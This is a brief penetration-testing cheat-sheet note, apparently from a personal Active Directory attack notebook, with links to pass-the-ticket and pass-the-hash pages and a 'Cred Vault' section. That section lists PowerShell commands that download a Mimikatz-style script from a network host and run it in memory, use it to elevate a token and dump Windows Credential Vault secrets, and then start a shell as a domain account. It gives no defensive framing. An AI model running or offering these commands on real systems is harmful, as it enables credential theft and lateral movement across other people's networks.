# eKeys > [[Pass the Ticket]]


# SamDump > [[Pass the Hash]]


# Cred Vault 
```powershell

```
PS > iex (iwr http://172.16.100.1/Invoke-Mimi.ps1 -UseBasicParsing)

PS > Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'

PS > runas /netonly /user:tech\databaseagent powershell.exe

**